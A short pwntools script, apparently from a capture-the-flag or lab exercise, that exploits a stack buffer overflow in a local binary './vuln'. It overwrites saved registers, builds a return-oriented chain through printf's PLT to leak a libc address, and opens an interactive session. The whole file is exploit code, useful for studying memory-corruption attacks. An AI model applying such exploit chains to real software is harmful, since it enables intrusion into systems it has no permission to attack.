from pwn import*

context.update(arch='amd64',os='linux',log_level='debug')
context.terminal=['qterminal','-e']

p=process('./vuln')
gdb.attach(p,'b* 0x401271')
printf_got=0x403FD8
printf_plt=0x401084
bss=0x4040e0+0x800+0x8
ret=0x40101a
p.recvuntil('\n')
p.sendline('1')
sleep(0.1)
payload=b"aaaaaaaa"+b"b"*8+b"c"*8+b"d"*8+p64(bss)
payload+=p64(ret)+p64(printf_plt)+p64(0x401279)
pause()
p.sendline(payload)
addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.info("addr= %#x" % (addr))
p.interactive()